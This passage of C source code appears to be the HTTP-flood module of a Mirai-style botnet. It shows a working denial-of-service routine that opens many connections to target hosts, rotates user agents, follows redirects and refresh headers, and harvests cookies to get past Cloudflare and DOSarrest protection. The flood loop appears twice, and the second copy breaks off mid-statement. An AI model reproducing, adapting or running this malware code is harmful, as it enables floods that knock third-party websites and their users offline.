                table_lock_val(TABLE_HTTP_FIVE);
                break;
        }

        util_strcpy(http_table[i].path, path);
    }

    while(TRUE)
    {
        fd_set fdset_rd, fdset_wr;
        int mfd = 0, nfds;
        struct timeval tim;
        struct attack_http_state *conn;
        uint32_t fake_time = time(NULL);

        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);

        for (i = 0; i < sockets; i++)
        {
            conn = &(http_table[i]);

            if (conn->state == HTTP_CONN_RESTART)
            {
                if (conn->keepalive)
                    conn->state = HTTP_CONN_SEND;
                else
                    conn->state = HTTP_CONN_INIT;
            }

            if (conn->state == HTTP_CONN_INIT)
            {
                struct sockaddr_in addr = {0};

                if (conn->fd != -1)
                    close(conn->fd);
                if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
                    continue;

                fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

                ii = 65535;
                setsockopt(conn->fd, 0, SO_RCVBUF, &ii ,sizeof(int));

                addr.sin_family = AF_INET;
                addr.sin_addr.s_addr = conn->dst_addr;
                addr.sin_port = htons(dport);

                conn->last_recv = fake_time;
                conn->state = HTTP_CONN_CONNECTING;
                connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
#ifdef DEBUG
                printf("[http flood] fd%d started connect\n", conn->fd);
#endif

                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_CONNECTING)
            {
                if (fake_time - conn->last_recv > 30)
                {
                    conn->state = HTTP_CONN_INIT;
                    close(conn->fd);
                    conn->fd = -1;
                    continue;
                }

                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_SEND)
            {
                conn->content_length = -1; 
                conn->protection_type = 0;
                util_zero(conn->rdbuf, HTTP_RDBUF_SIZE);
                conn->rdbuf_pos = 0;

#ifdef DEBUG
                //printf("[http flood] Sending http request\n");
#endif

                char buf[10240];
                util_zero(buf, 10240);

                util_strcpy(buf + util_strlen(buf), conn->method);
                util_strcpy(buf + util_strlen(buf), " ");
                util_strcpy(buf + util_strlen(buf), conn->path);
                util_strcpy(buf + util_strlen(buf), " HTTP/1.2\r\nUser-Agent: ");
                util_strcpy(buf + util_strlen(buf), conn->user_agent);
                util_strcpy(buf + util_strlen(buf), "\r\nHost: ");
                util_strcpy(buf + util_strlen(buf), conn->domain);
                util_strcpy(buf + util_strlen(buf), "\r\n");

                table_unlock_val(TABLE_ATK_KEEP_ALIVE);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_KEEP_ALIVE, NULL));
                table_lock_val(TABLE_ATK_KEEP_ALIVE);
                util_strcpy(buf + util_strlen(buf), "\r\n");

                table_unlock_val(TABLE_ATK_ACCEPT);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_ACCEPT, NULL));
                table_lock_val(TABLE_ATK_ACCEPT);
                util_strcpy(buf + util_strlen(buf), "\r\n");

                table_unlock_val(TABLE_ATK_ACCEPT_LNG);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_ACCEPT_LNG, NULL));
                table_lock_val(TABLE_ATK_ACCEPT_LNG);
                util_strcpy(buf + util_strlen(buf), "\r\n");

                if (postdata != NULL)
                {
                    table_unlock_val(TABLE_ATK_CONTENT_TYPE);
                    util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_CONTENT_TYPE, NULL));
                    table_lock_val(TABLE_ATK_CONTENT_TYPE);

                    util_strcpy(buf + util_strlen(buf), "\r\n");
                    util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_CONTENT_LENGTH_HDR, NULL));
                    util_strcpy(buf + util_strlen(buf), " ");
                    util_itoa(util_strlen(postdata), 10, buf + util_strlen(buf));
                    util_strcpy(buf + util_strlen(buf), "\r\n");
                }

                if (conn->num_cookies > 0)
                {
                    util_strcpy(buf + util_strlen(buf), "Cookie: ");
                    for (ii = 0; ii < conn->num_cookies; ii++)
                    {
                        util_strcpy(buf + util_strlen(buf), conn->cookies[ii]);
                        util_strcpy(buf + util_strlen(buf), "; ");
                    }
                    util_strcpy(buf + util_strlen(buf), "\r\n");
                }

                util_strcpy(buf + util_strlen(buf), "\r\n");

                if (postdata != NULL)
                    util_strcpy(buf + util_strlen(buf), postdata);

                if (!util_strcmp(conn->method, conn->orig_method))
                    util_strcpy(conn->method, conn->orig_method);

#ifdef DEBUG
                if (sockets == 1)
                {
                    printf("sending buf: \"%s\"\n", buf);
                }
#endif

                send(conn->fd, buf, util_strlen(buf), MSG_NOSIGNAL);
                conn->last_send = fake_time;

                conn->state = HTTP_CONN_RECV_HEADER;
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_RECV_HEADER)
            {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_RECV_BODY)
            {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_QUEUE_RESTART)
            {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_CLOSED)
            {
                conn->state = HTTP_CONN_INIT;
                close(conn->fd);
                conn->fd = -1;
            }
            else
            {
                // NEW STATE WHO DIS
                conn->state = HTTP_CONN_INIT;
                close(conn->fd);
                conn->fd = -1;
            }
        }

        if (mfd == 0)
            continue;

        tim.tv_usec = 0;
        tim.tv_sec = 1;
        nfds = select(mfd, &fdset_rd, &fdset_wr, NULL, &tim);
        fake_time = time(NULL);

        if (nfds < 1)
            continue;

        for (i = 0; i < sockets; i++)
        {
            conn = &(http_table[i]);

            if (conn->fd == -1)
                continue;

            if (FD_ISSET(conn->fd, &fdset_wr))
            {
                int err = 0;
                socklen_t err_len = sizeof (err);

                ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err == 0 && ret == 0)
                {
#ifdef DEBUG
                    printf("[http flood] FD%d connected.\n", conn->fd);
#endif
                        conn->state = HTTP_CONN_SEND;
                }
                else
                {
#ifdef DEBUG
                    printf("[http flood] FD%d error while connecting = %d\n", conn->fd, err);
#endif
                    close(conn->fd);
                    conn->fd = -1;
                    conn->state = HTTP_CONN_INIT;
                    continue;
                }
            }

        if (FD_ISSET(conn->fd, &fdset_rd))
            {
                if (conn->state == HTTP_CONN_RECV_HEADER)
                {
                    int processed = 0;

                    util_zero(generic_memes, 10240);
                    if ((ret = recv(conn->fd, generic_memes, 10240, MSG_NOSIGNAL | MSG_PEEK)) < 1)
                    {
                        close(conn->fd);
                        conn->fd = -1;
                        conn->state = HTTP_CONN_INIT;
                        continue;
                    }


                    // we want to process a full http header (^:
                    if (util_memsearch(generic_memes, ret, "\r\n\r\n", 4) == -1 && ret < 10240)
                        continue;

                    generic_memes[util_memsearch(generic_memes, ret, "\r\n\r\n", 4)] = 0;

#ifdef DEBUG
                    if (sockets == 1)
                        printf("[http flood] headers: \"%s\"\n", generic_memes);
#endif

                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CLOUDFLARE_NGINX, NULL)) != -1)
                        conn->protection_type = HTTP_PROT_CLOUDFLARE;

                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_DOSARREST, NULL)) != -1)
                        conn->protection_type = HTTP_PROT_DOSARREST;

                    conn->keepalive = 0;
                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CONNECTION_HDR, NULL)) != -1)
                    {
                        int offset = util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CONNECTION_HDR, NULL));
                        if (generic_memes[offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2);
                        if (nl_off != -1)
                        {
                            char *con_ptr = &(generic_memes[offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;
                            generic_memes[offset + nl_off] = 0;

                            if (util_stristr(con_ptr, util_strlen(con_ptr), table_retrieve_val(TABLE_ATK_KEEP_ALIVE_HDR, NULL)))
                                conn->keepalive = 1;
                        }
                    }

                    conn->chunked = 0;
                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_TRANSFER_ENCODING_HDR, NULL)) != -1)
                    {
                        int offset = util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_TRANSFER_ENCODING_HDR, NULL));
                        if (generic_memes[offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2);
                        if (nl_off != -1)
                        {
                            char *con_ptr = &(generic_memes[offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;
                            generic_memes[offset + nl_off] = 0;

                            if (util_stristr(con_ptr, util_strlen(con_ptr), table_retrieve_val(TABLE_ATK_CHUNKED, NULL)))
                                conn->chunked = 1;
                        }
                    }

                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CONTENT_LENGTH_HDR, NULL)) != -1)
                    {
                        int offset = util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CONTENT_LENGTH_HDR, NULL));
                        if (generic_memes[offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2);
                        if (nl_off != -1)
                        {
                            char *len_ptr = &(generic_memes[offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;
                            generic_memes[offset + nl_off] = 0;

                            conn->content_length = util_atoi(len_ptr, 10);
                        }
                    } else {
                        conn->content_length = 0;
                    }

                    processed = 0;
                    while (util_stristr(generic_memes + processed, ret, table_retrieve_val(TABLE_ATK_SET_COOKIE_HDR, NULL)) != -1 && conn->num_cookies < HTTP_COOKIE_MAX)
                    {
                        int offset = util_stristr(generic_memes + processed, ret, table_retrieve_val(TABLE_ATK_SET_COOKIE_HDR, NULL));
                        if (generic_memes[processed + offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + processed + offset, ret - processed - offset, "\r\n", 2);
                        if (nl_off != -1)
                        {
                            char *cookie_ptr = &(generic_memes[processed + offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;

                            if (util_memsearch(generic_memes + processed + offset, ret - processed - offset, ";", 1) > 0)
                                nl_off = util_memsearch(generic_memes + processed + offset, ret - processed - offset, ";", 1) - 1;

                            generic_memes[processed + offset + nl_off] = 0;

                            for (ii = 0; ii < util_strlen(cookie_ptr); ii++)
                                if (cookie_ptr[ii] == '=')
                                    break;

                            if (cookie_ptr[ii] == '=')
                            {
                                int equal_off = ii, cookie_exists = FALSE;

                                for (ii = 0; ii < conn->num_cookies; ii++)
                                    if (util_strncmp(cookie_ptr, conn->cookies[ii], equal_off))
                                    {
                                        cookie_exists = TRUE;
                                        break;
                                    }

                                if (!cookie_exists)
                                {
                                    if (util_strlen(cookie_ptr) < HTTP_COOKIE_LEN_MAX)
                                    {
                                        util_strcpy(conn->cookies[conn->num_cookies], cookie_ptr);
                                        conn->num_cookies++;
                                    }
                                }
                            }
                        }

                        processed += offset;
                    }

                    // this will still work as previous handlers will only add in null chars or similar
                    // and we specify the size of the string to stristr
                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_LOCATION_HDR, NULL)) != -1)
                    {
                        int offset = util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_LOCATION_HDR, NULL));
                        if (generic_memes[offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2);
                        if (nl_off != -1)
                        {
                            char *loc_ptr = &(generic_memes[offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;
                            generic_memes[offset + nl_off] = 0;

                            //increment it one so that it is length of the string excluding null char instead of 0-based offset
                            nl_off++;

                            if (util_memsearch(loc_ptr, nl_off, "http", 4) == 4)
                            {
                                //this is an absolute url, domain name change maybe?
                                ii = 7;
                                //http(s)
                                if (loc_ptr[4] == 's')
                                    ii++;

                                memmove(loc_ptr, loc_ptr + ii, nl_off - ii);
                                ii = 0;
                                while (loc_ptr[ii] != 0)
                                {
                                    if (loc_ptr[ii] == '/')
                                    {
                                        loc_ptr[ii] = 0;
                                        break;
                                    }
                                    ii++;
                                }

                                // domain: loc_ptr;
                                // path: &(loc_ptr[ii + 1]);

                                if (util_strlen(loc_ptr) > 0 && util_strlen(loc_ptr) < HTTP_DOMAIN_MAX)
                                    util_strcpy(conn->domain, loc_ptr);

                                if (util_strlen(&(loc_ptr[ii + 1])) < HTTP_PATH_MAX)
                                {
                                    util_zero(conn->path + 1, HTTP_PATH_MAX - 1);
                                    if (util_strlen(&(loc_ptr[ii + 1])) > 0)
                                        util_strcpy(conn->path + 1, &(loc_ptr[ii + 1]));
                                }
                            }
                            else if (loc_ptr[0] == '/')
                            {
                                //handle relative url
                                util_zero(conn->path + 1, HTTP_PATH_MAX - 1);
                                if (util_strlen(&(loc_ptr[ii + 1])) > 0 && util_strlen(&(loc_ptr[ii + 1])) < HTTP_PATH_MAX)
                                    util_strcpy(conn->path + 1, &(loc_ptr[ii + 1]));
                            }

                            conn->state = HTTP_CONN_RESTART;
                            continue;
                        }
                    }

                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_REFRESH_HDR, NULL)) != -1)
                    {
                        int offset = util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_REFRESH_HDR, NULL));
                        if (generic_memes[offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2);
                        if (nl_off != -1)
                        {
                            char *loc_ptr = &(generic_memes[offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;
                            generic_memes[offset + nl_off] = 0;

                            //increment it one so that it is length of the string excluding null char instead of 0-based offset
                            nl_off++;

                            ii = 0;

                            while (loc_ptr[ii] != 0 && loc_ptr[ii] >= '0' && loc_ptr[ii] <= '9')
                                ii++;

                            if (loc_ptr[ii] != 0)
                            {
                                int wait_time = 0;
                                loc_ptr[ii] = 0;
                                ii++;

                                if (loc_ptr[ii] == ' ')
                                    ii++;

                                if (util_stristr(&(loc_ptr[ii]), util_strlen(&(loc_ptr[ii])), "url=") != -1)
                                    ii += util_stristr(&(loc_ptr[ii]), util_strlen(&(loc_ptr[ii])), "url=");

                                if (loc_ptr[ii] == '"')
                                {
                                    ii++;

                                    //yes its ugly, but i dont care
                                    if ((&(loc_ptr[ii]))[util_strlen(&(loc_ptr[ii])) - 1] == '"')
                                        (&(loc_ptr[ii]))[util_strlen(&(loc_ptr[ii])) - 1] = 0;
                                }

                                wait_time = util_atoi(loc_ptr, 10);

                                //YOLO LOL
                                while (wait_time > 0 && wait_time < 10 && fake_time + wait_time > time(NULL))
                                    sleep(1);

                                loc_ptr = &(loc_ptr[ii]);


                                if (util_stristr(loc_ptr, util_strlen(loc_ptr), "http") == 4)
                                {
                                    //this is an absolute url, domain name change maybe?
                                    ii = 7;
                                    //http(s)
                                    if (loc_ptr[4] == 's')
                                        ii++;

                                    memmove(loc_ptr, loc_ptr + ii, nl_off - ii);
                                    ii = 0;
                                    while (loc_ptr[ii] != 0)
                                    {
                                        if (loc_ptr[ii] == '/')
                                        {
                                            loc_ptr[ii] = 0;
                                            break;
                                        }
                                        ii++;
                                    }

                                    // domain: loc_ptr;
                                    // path: &(loc_ptr[ii + 1]);

                                    if (util_strlen(loc_ptr) > 0 && util_strlen(loc_ptr) < HTTP_DOMAIN_MAX)
                                        util_strcpy(conn->domain, loc_ptr);

                                    if (util_strlen(&(loc_ptr[ii + 1])) < HTTP_PATH_MAX)
                                    {
                                        util_zero(conn->path + 1, HTTP_PATH_MAX - 1);
                                        if (util_strlen(&(loc_ptr[ii + 1])) > 0)
                                            util_strcpy(conn->path + 1, &(loc_ptr[ii + 1]));
                                    }
                                }
                                else if (loc_ptr[0] == '/')
                                {
                                    //handle relative url
                                    if (util_strlen(&(loc_ptr[ii + 1])) < HTTP_PATH_MAX)
                                    {
                                        util_zero(conn->path + 1, HTTP_PATH_MAX - 1);
                                        if (util_strlen(&(loc_ptr[ii + 1])) > 0)
                                            util_strcpy(conn->path + 1, &(loc_ptr[ii + 1]));
                                    }
                                }

                                strcpy(conn->method, "GET");
                                // queue the state up for the next time
                                conn->state = HTTP_CONN_QUEUE_RESTART;
                                continue;
                            }
                        }
                    }

                    // actually pull the content from the buffer that we processed via MSG_PEEK
                    processed = util_memsearch(generic_memes, ret, "\r\n\r\n", 4);

                    if (util_strcmp(conn->method, "POST") || util_strcmp(conn->method, "GET"))
                        conn->state = HTTP_CONN_RECV_BODY;
                    else if (ret > processed)
                        conn->state = HTTP_CONN_QUEUE_RESTART;
                    else
                        conn->state = HTTP_CONN_RESTART;

                    ret = recv(conn->fd, generic_memes, processed, MSG_NOSIGNAL);
                } else if (conn->state == HTTP_CONN_RECV_BODY) {
                    while (TRUE)
                    {
                        // spooky doods changed state
                        if (conn->state != HTTP_CONN_RECV_BODY)
                        {
                            break;
                        }

                        if (conn->rdbuf_pos == HTTP_RDBUF_SIZE)
                        {
                            memmove(conn->rdbuf, conn->rdbuf + HTTP_HACK_DRAIN, HTTP_RDBUF_SIZE - HTTP_HACK_DRAIN);
                            conn->rdbuf_pos -= HTTP_HACK_DRAIN;
                        }
                        errno = 0;
                        ret = recv(conn->fd, conn->rdbuf + conn->rdbuf_pos, HTTP_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                        if (ret == 0)
                        {
#ifdef DEBUG
                            printf("[http flood] FD%d connection gracefully closed\n", conn->fd);
#endif
                            errno = ECONNRESET;
                            ret = -1; // Fall through to closing connection below
                        }
                        if (ret == -1)
                        {
                            if (errno != EAGAIN && errno != EWOULDBLOCK)
                            {
#ifdef DEBUG
                                printf("[http flood] FD%d lost connection\n", conn->fd);
#endif
                                close(conn->fd);
                                conn->fd = -1;
                                conn->state = HTTP_CONN_INIT;
                            }
                            break;
                        }

                        conn->rdbuf_pos += ret;
                        conn->last_recv = fake_time;

                        while (TRUE)
                        {
                            int consumed = 0;

                            if (conn->content_length > 0)
                            {

                                consumed = conn->content_length > conn->rdbuf_pos ? conn->rdbuf_pos : conn->content_length;
                                conn->content_length -= consumed;

                                if (conn->protection_type == HTTP_PROT_DOSARREST)
                                {
                                    // we specifically want this to be case sensitive
                                    if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, table_retrieve_val(TABLE_ATK_SET_COOKIE, NULL), 11) != -1)
                                    {
                                        int start_pos = util_memsearch(conn->rdbuf, conn->rdbuf_pos, table_retrieve_val(TABLE_ATK_SET_COOKIE, NULL), 11);
                                        int end_pos = util_memsearch(&(conn->rdbuf[start_pos]), conn->rdbuf_pos - start_pos, "'", 1);
                                        conn->rdbuf[start_pos + (end_pos - 1)] = 0;

                                        if (conn->num_cookies < HTTP_COOKIE_MAX && util_strlen(&(conn->rdbuf[start_pos])) < HTTP_COOKIE_LEN_MAX)
                                        {
                                            util_strcpy(conn->cookies[conn->num_cookies], &(conn->rdbuf[start_pos]));
                                            util_strcpy(conn->cookies[conn->num_cookies] + util_strlen(conn->cookies[conn->num_cookies]), "=");

                                            start_pos += end_pos + 3;
                                            end_pos = util_memsearch(&(conn->rdbuf[start_pos]), conn->rdbuf_pos - start_pos, "'", 1);
                                            conn->rdbuf[start_pos + (end_pos - 1)] = 0;

                                            util_strcpy(conn->cookies[conn->num_cookies] + util_strlen(conn->cookies[conn->num_cookies]), &(conn->rdbuf[start_pos]));
                                            conn->num_cookies++;
                                        }

                                        conn->content_length = -1;
                                        conn->state = HTTP_CONN_QUEUE_RESTART;
                                        break;
                                    }
                                }
                            }

                            if (conn->content_length == 0)
                            {
                                if (conn->chunked == 1)
                                {
                                    if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, "\r\n", 2) != -1)
                                    {
                                        int new_line_pos = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "\r\n", 2);
                                        conn->rdbuf[new_line_pos - 2] = 0;
                                        if (util_memsearch(conn->rdbuf, new_line_pos, ";", 1) != -1)
                                            conn->rdbuf[util_memsearch(conn->rdbuf, new_line_pos, ";", 1)] = 0;

                                        int chunklen = util_atoi(conn->rdbuf, 16);

                                        if (chunklen == 0)
                                        {
                                            conn->state = HTTP_CONN_RESTART;
                                            break;
                                        }

                                        conn->content_length = chunklen + 2;
                                        consumed = new_line_pos;
                                    }
                                } else {
                                    // get rid of any extra in the buf before we move on...
                                    conn->content_length = conn->rdbuf_pos - consumed;
                                    if (conn->content_length == 0)
                                    {
                                        conn->state = HTTP_CONN_RESTART;
                                        break;
                                    }
                                }
                            }

                            if (consumed == 0)
                                break;
                            else
                            {
                                conn->rdbuf_pos -= consumed;
                                memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
                                conn->rdbuf[conn->rdbuf_pos] = 0;

                                if (conn->rdbuf_pos == 0)
                                    break;
                            }
                        }
                    }
                } else if (conn->state == HTTP_CONN_QUEUE_RESTART) {
                    while(TRUE)
                    {
                        errno = 0;
                        ret = recv(conn->fd, generic_memes, 10240, MSG_NOSIGNAL);
                        if (ret == 0)
                        {
#ifdef DEBUG
                            printf("[http flood] HTTP_CONN_QUEUE_RESTART FD%d connection gracefully closed\n", conn->fd);
#endif
                            errno = ECONNRESET;
                            ret = -1; // Fall through to closing connection below
                        }
                        if (ret == -1)
                        {
                            if (errno != EAGAIN && errno != EWOULDBLOCK)
                            {
#ifdef DEBUG
                                printf("[http flood] HTTP_CONN_QUEUE_RESTART FD%d lost connection\n", conn->fd);
#endif
                                close(conn->fd);
                                conn->fd = -1;
                                conn->state = HTTP_CONN_INIT;
                            }
                            break;
                        }    
                    }
                    if (conn->state != HTTP_CONN_INIT)
                        conn->state = HTTP_CONN_RESTART;
                }
            }
        }

        // handle any sockets that didnt return from select here
        // also handle timeout on HTTP_CONN_QUEUE_RESTART just in case there was no other data to be read (^: (usually this will never happen)
#ifdef DEBUG
        if (sockets == 1)
        {
            printf("debug mode sleep\n");
            sleep(1);
        }
#endif
    }
}

void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, ii, rfd, ret = 0;
    struct attack_http_state *http_table = NULL;
    char *postdata = attack_get_opt_str(opts_len, opts, ATK_OPT_POST_DATA, NULL);
    char *method = attack_get_opt_str(opts_len, opts, ATK_OPT_METHOD, "GET");
    char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
    char *path = attack_get_opt_str(opts_len, opts, ATK_OPT_PATH, "/");
    int sockets = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 1);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);

    char generic_memes[10241] = {0};

    if (domain == NULL || path == NULL)
        return;

    if (util_strlen(path) > HTTP_PATH_MAX - 1)
        return;

    if (util_strlen(domain) > HTTP_DOMAIN_MAX - 1)
        return;

    if (util_strlen(method) > 9)
        return;

    // BUT BRAH WHAT IF METHOD IS THE DEFAULT VALUE WONT IT SEGFAULT CAUSE READ ONLY STRING?
    // yes it would segfault but we only update the values if they are not already uppercase.
    // if the method is lowercase and its passed from the CNC we can update that memory no problem
    for (ii = 0; ii < util_strlen(method); ii++)
        if (method[ii] >= 'a' && method[ii] <= 'z')
            method[ii] -= 32;

    if (sockets > HTTP_CONNECTION_MAX)
        sockets = HTTP_CONNECTION_MAX;

    // unlock frequently used strings
    table_unlock_val(TABLE_ATK_SET_COOKIE);
    table_unlock_val(TABLE_ATK_REFRESH_HDR);
    table_unlock_val(TABLE_ATK_LOCATION_HDR);
    table_unlock_val(TABLE_ATK_SET_COOKIE_HDR);
    table_unlock_val(TABLE_ATK_CONTENT_LENGTH_HDR);
    table_unlock_val(TABLE_ATK_TRANSFER_ENCODING_HDR);
    table_unlock_val(TABLE_ATK_CHUNKED);
    table_unlock_val(TABLE_ATK_KEEP_ALIVE_HDR);
    table_unlock_val(TABLE_ATK_CONNECTION_HDR);
    table_unlock_val(TABLE_ATK_DOSARREST);
    table_unlock_val(TABLE_ATK_CLOUDFLARE_NGINX);

    http_table = calloc(sockets, sizeof(struct attack_http_state));

    for (i = 0; i < sockets; i++)
    {
        http_table[i].state = HTTP_CONN_INIT;
        http_table[i].fd = -1;
        http_table[i].dst_addr = targs[i % targs_len].addr;

        util_strcpy(http_table[i].path, path);

        if (http_table[i].path[0] != '/')
        {
            memmove(http_table[i].path + 1, http_table[i].path, util_strlen(http_table[i].path));
            http_table[i].path[0] = '/';
        }

        util_strcpy(http_table[i].orig_method, method);
        util_strcpy(http_table[i].method, method);

        util_strcpy(http_table[i].domain, domain);

        if (targs[i % targs_len].netmask < 32)
            http_table[i].dst_addr = htonl(ntohl(targs[i % targs_len].addr) + (((uint32_t)rand_next()) >> targs[i % targs_len].netmask));

        switch(rand_next() % 5)
        {
            case 0:
                table_unlock_val(TABLE_HTTP_ONE);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_ONE, NULL));
                table_lock_val(TABLE_HTTP_ONE);
                break;
            case 1:
                table_unlock_val(TABLE_HTTP_TWO);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_TWO, NULL));
                table_lock_val(TABLE_HTTP_TWO);
                break;
            case 2:
                table_unlock_val(TABLE_HTTP_THREE);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_THREE, NULL));
                table_lock_val(TABLE_HTTP_THREE);
                break;
            case 3:
                table_unlock_val(TABLE_HTTP_FOUR);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_FOUR, NULL));
                table_lock_val(TABLE_HTTP_FOUR);
                break;
            case 4:
                table_unlock_val(TABLE_HTTP_FIVE);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_FIVE, NULL));
                table_lock_val(TABLE_HTTP_FIVE);
                break;
        }

        util_strcpy(http_table[i].path, path);
    }

    while(TRUE)
    {
        fd_set fdset_rd, fdset_wr;
        int mfd = 0, nfds;
        struct timeval tim;
        struct attack_http_state *conn;
        uint32_t fake_time = time(NULL);

        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);

        for (i = 0; i < sockets; i++)
        {
            conn = &(http_table[i]);

            if (conn->state == HTTP_CONN_RESTART)
            {
                if (conn->keepalive)
                    conn->state = HTTP_CONN_SEND;
                else
                    conn->state = HTTP_CONN_INIT;
            }

            if (conn->state == HTTP_CONN_INIT)
            {
                struct sockaddr_in addr = {0};

                if (conn->fd != -1)
                    close(conn->fd);
                if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
                    continue;

                fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

                ii = 65535;
                setsockopt(conn->fd, 0, SO_RCVBUF, &ii ,sizeof(int));

                addr.sin_family = AF_INET;
                addr.sin_addr.s_addr = conn->dst_addr;
                addr.sin_port = htons(dport);

                conn->last_recv = fake_time;
                conn->state = HTTP_CONN_CONNECTING;
                connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
#ifdef DEBUG
                printf("[http flood] fd%d started connect\n", conn->fd);
#endif

                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_CONNECTING)
            {
                if (fake_time - conn->last_recv > 30)
                {
                    conn->state = HTTP_CONN_INIT;
                    close(conn->fd);
                    conn->fd = -1;
                    continue;
                }

                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_SEND)
            {
                conn->content_length = -1; 
                conn->protection_type = 0;
                util_zero(conn->rdbuf, HTTP_RDBUF_SIZE);
                conn->rdbuf_pos = 0;

#ifdef DEBUG
                //printf("[http flood] Sending http request\n");
#endif

                char buf[10240];
                util_zero(buf, 10240);

                util_strcpy(buf + util_strlen(buf), conn->method);
                util_strcpy(buf + util_strlen(buf), " ");
                util_strcpy(buf + util_strlen(buf), conn->path);
                util_strcpy(buf + util_strlen(buf), " HTTP/1.1\r\nUser-Agent: ");
                util_strcpy(buf + util_strlen(buf), conn->user_agent);
                util_strcpy(buf + util_strlen(buf), "\r\nHost: ");
                util_strcpy(buf + util_strlen(buf), conn->domain);
                util_strcpy(buf + util_strlen(buf), "\r\n");

                table_unlock_val(TABLE_ATK_KEEP_ALIVE);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_KEEP_ALIVE, NULL));
                table_lock_val(TABLE_ATK_KEEP_ALIVE);
                util_strcpy(buf + util_strlen(buf), "\r\n");

                table_unlock_val(TABLE_ATK_ACCEPT);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_ACCEPT, NULL));
                table_lock_val(TABLE_ATK_ACCEPT);
                util_strcpy(buf + util_strlen(buf), "\r\n");

                table_unlock_val(TABLE_ATK_ACCEPT_LNG);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_ACCEPT_LNG, NULL));
                table_lock_val(TABLE_ATK_ACCEPT_LNG);
                util_strcpy(buf + util_strlen(buf), "\r\n");

                if (postdata != NULL)
                {
                    table_unlock_val(TABLE_ATK_CONTENT_TYPE);
                    util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_CONTENT_TYPE, NULL));
                    table_lock_val(TABLE_ATK_CONTENT_TYPE);

